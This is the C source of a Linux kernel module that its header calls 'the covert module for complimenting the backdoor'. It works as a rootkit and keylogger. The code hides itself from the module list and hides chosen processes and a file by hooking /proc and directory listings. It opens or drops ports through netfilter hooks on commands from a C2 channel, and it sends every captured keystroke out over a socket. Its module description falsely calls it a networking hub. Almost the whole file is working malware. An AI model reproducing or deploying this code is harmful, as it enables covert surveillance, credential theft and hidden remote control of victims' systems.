/*
 * Author and Designer: John Agapeyev
 * Date: 2018-09-22
 * Notes:
 * The covert module for complimenting the backdoor
 */

#include <linux/circ_buf.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/path.h>
#include <linux/pid_namespace.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/stop_machine.h>
#include <linux/tcp.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/un.h>
#include <linux/workqueue.h>
#include <net/sock.h>

#include "shared.h"

#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
#endif

static asmlinkage void (*change_pidR)(
        struct task_struct* task, enum pid_type type, struct pid* pid);
static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);

struct service {
    struct socket* tls_socket;
    struct task_struct* read_thread;
};

struct nf_hook_ops nfhi;
struct nf_hook_ops nfho;
struct service* svc;
struct sock* nl_sk;

static struct work_struct w;

unsigned char* buffer;
u16* open_ports;
u16* closed_ports;
size_t open_port_count = 0;
size_t closed_port_count = 0;

bool hidden = 0;
static struct list_head* mod_list;

static size_t hidden_procs[100];
int hidden_count = 0;

struct hidden_file {
    struct path path;
    struct file_operations fops;
    struct file_operations* backup_fops;
    struct inode* inode;
    struct dir_context* backup_ctx;
    struct dir_context bad_ctx;
    char name[PATH_MAX];
};
static struct hidden_file hidden_files[256];
int hidden_file_count = 0;

static rwlock_t* my_tasklist_lock;

static struct path proc_path;
static struct file_operations proc_fops;
static struct file_operations* backup_proc_fops;
static struct inode* proc_inode;
struct dir_context* backup_ctx;

void consume_keys(struct work_struct* work);

static const char* keylog_data;
static struct work_struct key_work;

int send_msg(struct socket* sock, unsigned char* buf, size_t len);
int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
int start_transmit(void);
int init_userspace_conn(void);
void UpdateChecksum(struct sk_buff* skb);
int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);
bool hide_file(const char* user_input, struct hidden_file* hf);

static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
        u64 ino, unsigned int d_type);
static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
        u64 ino, unsigned int d_type);

//Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
static struct notifier_block keysniffer_blk = {
        .notifier_call = keysniffer_cb,
};

struct dir_context bad_ctx = {
        .actor = proc_filldir_t,
};

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char* us_keymap[][2] = {
        {NULL, NULL}, {"<ESC>", "<ESC>"}, {"1", "!"}, {"2", "@"}, // 0-3
        {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, // 4-7
        {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, // 8-11
        {"-", "<"}, {"=", "+"}, {"<BACKSPACE>", "<BACKSPACE>"}, // 12-14
        {"<TAB>", "<TAB>"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"},
        {"u", "U"}, {"i", "I"}, // 20-23
        {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, // 24-27
        {"<ENTER>", "<ENTER>"}, {"<LCTRL>", "<LCTRL>"}, {"a", "A"}, {"s", "S"}, // 28-31
        {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, // 32-35
        {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, // 36-39
        {"'", "\""}, {"`", "~"}, {"<LSHIFT>", "<LSHIFT>"}, {"\\", "|"}, // 40-43
        {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, // 44-47
        {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, // 48-51
        {".", ">"}, {"/", "?"}, {"<RSHIFT>", "<RSHIFT>"}, {"<PRTSCR>", "<KPD*>"},
        {"<LALT>", "<LALT>"}, {"<SPACE>", "<SPACE>"}, {"<CAPS>", "<CAPS>"}, {"F1", "F1"},
        {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, // 60-63
        {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, // 64-67
        {"F10", "F10"}, {"<NUM>", "<NUM>"}, {"<SCROLL>", "<SCROLL>"}, // 68-70
        {"<KPD7>", "<HOME>"}, {"<KPD8>", "<UP>"}, {"<KPD9>", "<PGUP>"}, // 71-73
        {"-", "-"}, {"<KPD4>", "<LEFT>"}, {"<KPD5>", "<KPD5>"}, // 74-76
        {"<KPD6>", "<RIGHT>"}, {"+", "+"}, {"<KPD1>", "<END>"}, // 77-79
        {"<KPD2>", "<DOWN>"}, {"<KPD3>", "<PGDN"}, {"<KPD0>", "<INS>"}, // 80-82
        {"<KPD.>", "<DEL>"}, {"<SYSRQ>", "<SYSRQ>"}, {NULL, NULL}, // 83-85
        {NULL, NULL}, {"F11", "F11"}, {"F12", "F12"}, {NULL, NULL}, // 86-89
        {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL},
        {"<KPENTER>", "<KPENTER>"}, {"<RCTRL>", "<RCTRL>"}, {"/", "/"}, {"<PRTSCR>", "<PRTSCR>"},
        {"<RALT>", "<RALT>"}, {NULL, NULL}, // 99-101
        {"<HOME>", "<HOME>"}, {"<UP>", "<UP>"}, {"<PGUP>", "<PGUP>"}, // 102-104
        {"<LEFT>", "<LEFT>"}, {"<RIGHT>", "<RIGHT>"}, {"<END>", "<END>"}, {"<DOWN>", "<DOWN>"},
        {"<PGDN", "<PGDN"}, {"<INS>", "<INS>"}, // 108-110
        {"<DEL>", "<DEL>"}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 111-114
        {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, {NULL, NULL}, // 115-118
        {"<PAUSE>", "<PAUSE>"}, // 119
};

void hide(void) {
    if (hidden) {
        return;
    }

    while (!mutex_trylock(&module_mutex)) {
        cpu_relax();
    }
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    mutex_unlock(&module_mutex);
    hidden = true;
}

void show(void) {
    if (!hidden) {
        return;
    }

    while (!mutex_trylock(&module_mutex)) {
        cpu_relax();
    }
    list_add(&THIS_MODULE->list, mod_list);
    mutex_unlock(&module_mutex);
    hidden = false;
}

/*
 * function:
 *    UpdateChecksum
 *
 * return:
 *    void
 *
 * parameters:
 *    struct sk_buff* skb
 *
 * notes:
 * Recalculates the checksum of the packet after it has been modified.
 */
void UpdateChecksum(struct sk_buff* skb) {
    struct iphdr* ip_header = ip_hdr(skb);
    skb->ip_summed = CHECKSUM_NONE; //stop offloading
    skb->csum_valid = 0;
    ip_header->check = 0;
    ip_header->check = ip_fast_csum((u8*) ip_header, ip_header->ihl);

    if ((ip_header->protocol == IPPROTO_TCP) || (ip_header->protocol == IPPROTO_UDP)) {
        if (skb_is_nonlinear(skb)) {
            skb_linearize(skb);
        }

        if (ip_header->protocol == IPPROTO_TCP) {
            unsigned int tcplen;
            struct tcphdr* tcpHdr = tcp_hdr(skb);

            skb->csum = 0;
            tcplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            tcpHdr->check = 0;
            tcpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, tcplen,
                    IPPROTO_TCP, csum_partial((char*) tcpHdr, tcplen, 0));
        } else if (ip_header->protocol == IPPROTO_UDP) {
            unsigned int udplen;

            struct udphdr* udpHdr = udp_hdr(skb);
            skb->csum = 0;
            udplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            udpHdr->check = 0;
            udpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, udplen,
                    IPPROTO_UDP, csum_partial((char*) udpHdr, udplen, 0));
        }
    }
}

/*
 * function:
 *    recv_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel API
 */
int recv_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size = 0;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);

    return size;
}

/*
 * function:
 *    send_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel api
 */
int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_sendmsg(sock, &msg, &iov, 1, len);

    printk(KERN_INFO "Sent %d bytes out of %lu\n", size, len);

    return size;
}

void read_TLS(struct work_struct* work) {
    int len;
    u16 tmp_port = 0;
    const char* bad_len = "Invalid command length\n";
    const char* bad_port = "Invalid port number\n";
    const char* open = "Port is now open\n";
    const char* close = "Port is now closed\n";
    const char* unknown = "Unknown command\n";
    const char* clear = "All port settings cleared\n";
    const char* bad_drop = "Unable to close the C2 port\n";

    memset(buffer, 0, MAX_PAYLOAD);
    len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
    printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
    if (len < 5) {
        strcpy(buffer, bad_len);
        send_msg(svc->tls_socket, buffer, strlen(bad_len));
        return;
    }
    if (memcmp("open ", buffer, 5) == 0) {
        //Open a port
        if (kstrtou16(buffer + 5, 10, &tmp_port)) {
            strcpy(buffer, bad_port);
            send_msg(svc->tls_socket, buffer, strlen(bad_port));
            return;
        }
        open_ports[open_port_count++] = tmp_port;
        strcpy(buffer, open);
        send_msg(svc->tls_socket, buffer, strlen(open));
    } else if (memcmp("close ", buffer, 6) == 0) {
        //Close a port
        if (kstrtou16(buffer + 6, 10, &tmp_port)) {
            strcpy(buffer, bad_port);
            send_msg(svc->tls_socket, buffer, strlen(bad_port));
            return;
        }
        if (tmp_port == PORT) {
            strcpy(buffer, bad_drop);
            send_msg(svc->tls_socket, buffer, strlen(bad_drop));
            return;
        }
        closed_ports[closed_port_count++] = tmp_port;
        strcpy(buffer, close);
        send_msg(svc->tls_socket, buffer, strlen(close));
    } else if (memcmp("clear", buffer, 5) == 0) {
        open_port_count = 0;
        closed_port_count = 0;
        strcpy(buffer, clear);
        send_msg(svc->tls_socket, buffer, strlen(clear));
    } else if (memcmp("test", buffer, 4) == 0) {
        if (hidden) {
            show();
        } else {
            hide();
        }
    } else if (memcmp("hide", buffer, 4) == 0) {
        if (kstrtou16(buffer + 5, 10, &tmp_port)) {
            strcpy(buffer, bad_port);
            send_msg(svc->tls_socket, buffer, strlen(bad_port));
            return;
        }
        //Store the pid in the hidden proc list
        hidden_procs[hidden_count++] = tmp_port;
    } else {
        strcpy(buffer, unknown);
        send_msg(svc->tls_socket, buffer, strlen(unknown));
    }
    schedule_work(&w);
}

/*
 * function:
 *    init_userspace_conn
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Initializes the userspace connections needed.
 * Establishes tls socket with userspace.
 */
int init_userspace_conn(void) {
    int error;
    struct sockaddr_un sun;

    //TLS socket
    error = sock_create(AF_UNIX, SOCK_STREAM, 0, &svc->tls_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, UNIX_SOCK_PATH);

    error = kernel_connect(svc->tls_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
        return error;
    }

    return 0;
}

/*
 * function:
 *    incoming hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for incoming packets.
 * See API for details on arguments
 * All this does is handle packets according to allow/drop port lists
 */
unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;
    int i;

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);

        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(tcp_header->dest) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(tcp_header->dest) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    } else if (ip_header->protocol == IPPROTO_UDP) {
        udp_header = (struct udphdr*) skb_transport_header(skb);
        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(udp_header->dest) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(udp_header->dest) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    }
    return NF_ACCEPT;
}

/*
 * function:
 *    outgoing_hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for outgoing packets.
 * See API for details on arguments
 * All this does is handle packets according to allow/drop port lists
 */
unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;
    int i;

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);

        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(tcp_header->source) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(tcp_header->source) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    } else if (ip_header->protocol == IPPROTO_UDP) {
        udp_header = (struct udphdr*) skb_transport_header(skb);
        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(udp_header->source) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(udp_header->source) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    }
    return NF_ACCEPT;
}

int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
    struct keyboard_notifier_param* param = _param;
    const char* keycode = NULL;

    /* Trace only when a key is pressed down */
    if (!(param->down)) {
        return NOTIFY_OK;
    }

    //119 is the highest keycode we can translate
    if (param->value <= 119 && param->shift < 2) {
        keycode = us_keymap[param->value][param->shift];
    } else {
        return NOTIFY_OK;
    }
    // Unmapped keycode
    if (!keycode) {
        return NOTIFY_OK;
    }

    printk(KERN_INFO "Keycode: %s\n", keycode);

    keylog_data = keycode;

    INIT_WORK(&key_work, &consume_keys);
    schedule_work(&key_work);

    return NOTIFY_OK;
}

void consume_keys(struct work_struct* work) {
    unsigned char buffer[30];
    const char* keystroke = keylog_data;
    if (!keystroke) {
        return;
    }
    //k is for keystrokes
    buffer[0] = 'k';
    strcpy((char*) buffer + 1, keystroke);

    send_msg(svc->tls_socket, buffer, strlen((const char*) buffer));
    printk(KERN_INFO "Sent keystroke %s\n", keystroke);
}

static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
        u64 ino, unsigned int d_type) {
    int i;

    for (i = 0; i < hidden_file_count; ++i) {
        printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i].name);
        if (strncmp(proc_name, hidden_files[i].name, strlen(hidden_files[i].name)) == 0) {
            printk(KERN_ALERT "Found my hidden file\n");
            return 0;
        }
    }
    for (i = 0; i < hidden_file_count; ++i) {
        if (ctx == &hidden_files[i].bad_ctx) {
            return hidden_files[i].backup_ctx->actor(
                    hidden_files[i].backup_ctx, proc_name, len, off, ino, d_type);
        }
    }
    return ctx->actor(ctx, proc_name, len, off, ino, d_type);
}

int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
    int i;
    int result = 0;

    for (i = 0; i < hidden_file_count; ++i) {
        if (file && file->f_inode && file->f_inode == hidden_files[i].inode) {
            //Inodes match, use this context
            hidden_files[i].bad_ctx.pos = ctx->pos;
            hidden_files[i].backup_ctx = ctx;
            result = hidden_files[i].backup_fops->iterate_shared(file, &hidden_files[i].bad_ctx);
            ctx->pos = hidden_files[i].bad_ctx.pos;
            return result;
        }
    }
    result = file->f_inode->i_fop->iterate_shared(file, ctx);
    return result;
}

static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
        u64 ino, unsigned int d_type) {
    char p[64];
    int i;

    for (i = 0; i < hidden_count; ++i) {
        memset(p, 0, 64);
        //Convert stored pid to string
        snprintf(p, 64, "%lu", hidden_procs[i]);

        if (strncmp(proc_name, p, strlen(p)) == 0) {
            return 0;
        }
    }
    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

int proc_iterate_shared(struct file* file, struct dir_context* ctx) {
    int result = 0;
    bad_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate_shared(file, &bad_ctx);
    ctx->pos = bad_ctx.pos;
    return result;
}

bool hide_file(const char* user_input, struct hidden_file* hf) {
    int i, j;
    size_t str_size;
    char* user_file = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
    char* user_dir = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
    struct dir_context d = {
            .actor = rk_filldir_t,
    };

    strcpy(user_dir, user_input);
    memset(user_file, 0, strlen(user_input));

    j = 0;
    for (i = strlen(user_dir) - 1; i >= 0; --i) {
        if (user_dir[i] == '/') {
            break;
        }
        user_file[j++] = user_dir[i];
        user_dir[i] = '\0';
    }
    str_size = strlen(user_file);
    for (i = 0; i < str_size / 2; ++i) {
        char tmp = user_file[i];
        user_file[i] = user_file[str_size - i - 1];
        user_file[str_size - i - 1] = tmp;
    }

    printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_dir, user_file);

    if (kern_path(user_dir, 0, &hf->path)) {
        kfree(user_dir);
        kfree(user_file);
        return false;
    }
    hf->inode = hf->path.dentry->d_inode;
    hf->fops = *hf->inode->i_fop;
    hf->backup_fops = (struct file_operations *) hf->inode->i_fop;
    hf->fops.iterate_shared = rk_iterate_shared;
    hf->inode->i_fop = &hf->fops;

    memcpy(&hf->bad_ctx, &d, sizeof(struct dir_context));

    strcpy(hf->name, user_file);

    kfree(user_dir);
    kfree(user_file);
    return true;
}

/*
 * function:
 *    mod_init
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Module entry function
 */
char parent_name[PATH_MAX];
static int __init mod_init(void) {
    int err;

    change_pidR = (void (*)(struct task_struct*, enum pid_type, struct pid*)) kallsyms_lookup_name(
            "change_pid");
    alloc_pidR = (struct pid * (*) (struct pid_namespace*) ) kallsyms_lookup_name("alloc_pid");
    my_tasklist_lock = (rwlock_t*) kallsyms_lookup_name("tasklist_lock");

    if (kern_path("/proc", 0, &proc_path)) {
        return -1;
    }
    proc_inode = proc_path.dentry->d_inode;
    proc_fops = *proc_inode->i_fop;
    backup_proc_fops = (struct file_operations *) proc_inode->i_fop;
    proc_fops.iterate_shared = proc_iterate_shared;
    proc_inode->i_fop = &proc_fops;

    const char* user_input = "/aing-matrix";
    if (hide_file(user_input, hidden_files + hidden_file_count)) {
        ++hidden_file_count;
    }

    nfhi.hook = incoming_hook;
    nfhi.hooknum = NF_INET_LOCAL_IN;
    nfhi.pf = PF_INET;
    //Set hook highest priority
    nfhi.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfhi);

    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
    nfho.hook = outgoing_hook;
    nfho.hooknum = NF_INET_LOCAL_OUT;

    nf_register_net_hook(&init_net, &nfho);

    svc = kmalloc(sizeof(struct service), GFP_KERNEL);
    if ((err = init_userspace_conn()) < 0) {
        printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
        kfree(svc);

        nf_unregister_net_hook(&init_net, &nfho);
        nf_unregister_net_hook(&init_net, &nfhi);

        return err;
    }
    buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
    open_ports = kmalloc(2 * 65536, GFP_KERNEL);
    closed_ports = kmalloc(2 * 65536, GFP_KERNEL);

    INIT_WORK(&w, read_TLS);
    schedule_work(&w);

    hide();

    printk(KERN_ALERT "backdoor module loaded\n");

    register_keyboard_notifier(&keysniffer_blk);
    printk(KERN_ALERT "backdoor module loaded\n");
    return 0;
}

/*
 * function:
 *    mod_exit
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Module exit function
 */
static void __exit mod_exit(void) {
    int i;
    struct task_struct* ts;

    nf_unregister_net_hook(&init_net, &nfho);
    nf_unregister_net_hook(&init_net, &nfhi);

    unregister_keyboard_notifier(&keysniffer_blk);

    proc_inode = proc_path.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fops;

    for (i = 0; i < hidden_file_count; ++i) {
        hidden_files[i].inode = hidden_files[i].path.dentry->d_inode;
        hidden_files[i].inode->i_fop = hidden_files[i].backup_fops;
    }

    if (svc) {
        if (svc->tls_socket) {
            sock_release(svc->tls_socket);
            printk(KERN_INFO "release tls_socket\n");
        }
        kfree(svc);
    }

    if (buffer) {
        kfree(buffer);
    }
    if (open_ports) {
        kfree(open_ports);
    }
    if (closed_ports) {
        kfree(closed_ports);
    }

    write_lock(my_tasklist_lock);
    for (i = 0; i < hidden_count; ++i) {
        for_each_process(ts) {
            if (ts->pid == hidden_procs[i]) {
                //Force kill any hidden process on cleanup
                force_sig(SIGKILL, ts);
            }
        }
    }
    write_unlock(my_tasklist_lock);
    printk(KERN_ALERT "removed backdoor module\n");
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_DESCRIPTION("Kernel based networking hub");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("John Agapeyev <jagapeyev@gmail.com>");
